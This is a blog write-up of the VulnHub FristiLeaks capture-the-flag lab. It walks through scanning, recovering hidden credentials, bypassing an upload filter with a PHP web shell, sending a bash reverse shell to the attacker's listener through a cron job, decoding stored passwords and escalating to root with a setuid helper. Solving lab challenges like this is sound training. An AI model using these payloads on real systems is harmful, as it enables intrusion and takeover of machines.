---
title:  "VulnHub FristiLeaks Writeup"
date:   2015-12-31 00:00:00
description: I Think I Didn't Meet The Deadline
---

This is a writeup for VulnHub's [FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/) challenge.

### Host and Service Discovery

I don't think that we really need to cover this, as the IP address of the host is clearly written in the logon prompt after the virtual machine boots up. But here's how to find the IP address without looking at the VM's screen.

```
$ arp -v

Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.0.106            ether   08:00:27:a5:a6:76   C                     wlan0
192.168.0.1              ether   c0:4a:00:65:77:d6   C                     wlan0
Entries: 2  Skipped: 0  Found: 2
```

Then, we can proceed to scanning for services.

```
$ sudo nmap -T5 -A -v 192.168.0.106 -p 0-65535

Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 21:29 WIB
NSE: Loaded 110 scripts for scanning.
NSE: Script Pre-scanning.
Initiating ARP Ping Scan at 21:29
Scanning 192.168.0.106 [1 port]
Completed ARP Ping Scan at 21:29, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:29
Completed Parallel DNS resolution of 1 host. at 21:29, 6.78s elapsed
Initiating SYN Stealth Scan at 21:29
Scanning 192.168.0.106 [65536 ports]
Discovered open port 80/tcp on 192.168.0.106
SYN Stealth Scan Timing: About 35.32% done; ETC: 21:30 (0:00:57 remaining)
Completed SYN Stealth Scan at 21:30, 75.85s elapsed (65536 total ports)
Initiating Service scan at 21:30
Scanning 1 service on 192.168.0.106
Completed Service scan at 21:30, 6.01s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.0.106
NSE: Script scanning 192.168.0.106.
Initiating NSE at 21:30
Completed NSE at 21:30, 0.01s elapsed
Nmap scan report for 192.168.0.106
Host is up (0.00041s latency).
Not shown: 65535 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: GET HEAD POST OPTIONS TRACE
| Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Cadmus Computer Systems)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9, Linux 3.0 - 3.9
Uptime guess: 0.001 days (since Mon Dec 28 21:28:52 2015)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.0.106

NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.42 seconds
           Raw packets sent: 131104 (5.771MB) | Rcvd: 1481 (194.419KB)
```

The host only has port 80 open.

### The Web Application

I started checking the web application with a browser and running Nikto on it. Nikto doesn't give me anything useful. We got this image on the homepage, along to some references to Twitter.

![Keep-Calm](/assets/images/posts/fristileaks-keep-calm.png)

If we check the page source, we can see that the image is located on `/images` directory. The directory is vulnerable to directory indexing, hence we can see that the there's a picture of Obi-Wan Kenobi there.

![Obi-Wan](/assets/images/posts/fristileaks-obi-wan.jpg)

On the `robots.txt`, we can see three paths are disallowed.

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

Opening any of the disallowed paths will bring us to a page displaying Obi-Wan's image.

Since Nikto doesn't give me anything useful and all of the disallowed paths are named after drinks, I figured that I'd try `/fristi`. And I got a login page with this image.

![Ha-Ha](/assets/images/posts/fristileaks-ha-ha.jpg)

### The Login Page

Check the source code of the page, notice that the developer left us a message.

```html
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

And the meta tag is a huge clue for us.

```html
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
```

Under the Ha-Ha image's tag, there's another image encoded in base64 commented.

```html
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

Save the login page as a HTML file. Remove the comment markers and add proper tags in their place.

```html
<center><img src="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg=="></center><br>
```

Open the HTML file in a browser. We'll se an image displaying this string.

```
keKkeKKeKKeKkEkkEk
```

So this is our web login credentials.

```
eezeepz:keKkeKKeKKeKkEkkEk
```

### File Uploader

After logging in, we'll find a file uploader. It claims to only accept `png`, `jpg`, and `gif` image files. But we can upload files of other extensions by adding `.png`, `.jpg`, or `.gif` at the end of the filename. Uploaded files will be available on `/fristi/uploads` directory.

I tried uploading a PHP file named `shell.php.jpg`. Here's the content of the file.

```php
<pre>
<?php
  echo shell_exec($_GET['cmd']);
?>
</pre>
```

If I open `/fristi/uploads/shell.php.jpg`, it is displayed as a web page instead of an image. I can run shell commands from the `cmd` parameter. Running `whoami` will show us that we have the privilege of a user named apache.

### Reverse Shells

I decided to upload [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to the site with `netcat` listening on my host. Then I browsed the files and found that `/home/eezeepz` is accessible.

On `/home/eezeepz`, there's a file called `note.txt`.

```
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

So the good news is, we can put a command in a file named `runthis` in `/tmp` directory, and it will be run with privileges of a user called admin.

I tried to this command in the `runthis` file.

```bash
/bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
```

But when it's run, the `cronresult` shows that it's not successful (my listener doesn't get any incoming connection too).

```
command did not start with /home/admin or /usr/bin
```

Well, Jerry did say that he only allow commands from /usr/bin/ or /home/admin/. So I tried this instead.

```bash
/usr/bin/dir && /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
```

Start `netcat` to listen at port 6666.

```
$ nc -lvp 6666
```

Wait a minute for the connection, and we got the reverse shell.

### Admin

So we got the access to `/home/admin` with the reverse shell from cron with Jerry's privilege. There are a few interesting files there.

#### 1. whoisyourgodnow.txt

```
=RFn0AKnlMHMPIzpyuTI0ITG
```

Seems like a reversed base64-encoded string.

#### 2. cryptedpass.txt

```
mVGZ3O3omkJLmy2pcuTq
```

Seems like it's encrypted using the `cryptpass.py` script.


#### 3. cryptpass.py

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

### Decrypting the Passwords

It's pretty clear that the string in `cryptedpass.txt` is encrypted by using `cryptpass.py`. So to decrypt that, we need to reverse the process.

Using the Python shell in my host, doing this will return the plaintext of the `cryptedpass.txt` file.

```python
import base64,codecs,sys

ciphertext = 'mVGZ3O3omkJLmy2pcuTq'
decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
plaintext = base64.b64decode(decoded_codecs)
print plaintext
```

It returned a plaintext which happens to be the password for the user named admin (Jerry's user).

```
thisisalsopw123
```

And I tried to do the same for the crypted string in `whoisyourgodnow.txt`.

```python
import base64,codecs,sys

ciphertext = '=RFn0AKnlMHMPIzpyuTI0ITG'
decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
plaintext = base64.b64decode(decoded_codecs)
print plaintext
```

It returned this plaintext.

```
LetThereBeFristi!
```

I thought that it was the root's password because of the name of the file, but it doesn't seem to be it. But I checked the file once again and see that it belongs to the user fristigod. I can su to fristigod now.

But before that, I must spawn a tty.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

### Fristigod

We started in `/var/fristigod` directory when switching user to fristigod.

```
$ ls -alh

total 16K
drwxr-x---   3 fristigod fristigod 4.0K Nov 25 05:55 .
drwxr-xr-x. 19 root      root      4.0K Nov 19 01:41 ..
-rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4.0K Nov 25 05:53 .secret_admin_stuff
```

That .secret_admin_stuff directory seems interesting. I changed the directory and checked what's inside.

```
$ ls -alh

total 16K
drwxrwxr-x. 2 fristigod fristigod 4.0K Nov 25 05:53 .
drwxr-x---  3 fristigod fristigod 4.0K Nov 25 05:55 ..
-rwsr-sr-x  1 root      root      7.4K Nov 25 05:53 doCom
```

An executable file owned by root and is able to be run with root's privilege. Perfect!

But simply running `doCom` will give us this.

```
Nice try, but wrong user ;)
```

I tried checking the strings inside the executable.

```
$ strings doCom

/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setuid
exit
strcat
stderr
system
getuid
fwrite
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
Nice try, but wrong user ;)
Usage: ./program_name terminal_command ...
```

It doesn't seem to run any other program in the system that I can easily trick it to giving me root shell. But seems like it acts as a proxy to run shell commands as root for the right user.

I tried using sudo with fristigod, and I found out that fristigod is a sudoer (but with a very limited permission).

```
$ sudo -l -U fristigod

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

The user fristigod is allowed to run `doCom` as fristi. Let's try that.

```
$ sudo -u fristi ./doCom
```

And we got the right response.

```
Usage: ./program_name terminal_command ...
```

Try checking our privilege when executing the command with `doCom`.

```
$ sudo -u fristi ./doCom id

uid=0(root) gid=100(users) groups=100(users),502(fristigod)

$ sudo -u fristi ./doCom whoami

root
```

### Getting the Flag

As root, we're able to access the `/root` directory and check its contents. And here's our flag file, stored in that directory.

```
$ sudo -u fristi ./doCom ls /root

fristileaks_secrets.txt
```

Time to get our flag.

```
$ sudo -u fristi ./doCom cat /root/fristileaks_secrets.txt
```

And here's it is!

```
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1



```

By the way, I could just spawn a root shell with `doCom` instead of doing things one by one like that.

```
$ sudo -u fristi ./doCom /bin/bash
```

I wonder if I managed to finish it in 4 hours. I did it in three days, around one or two hours per day. But well, it's finished though.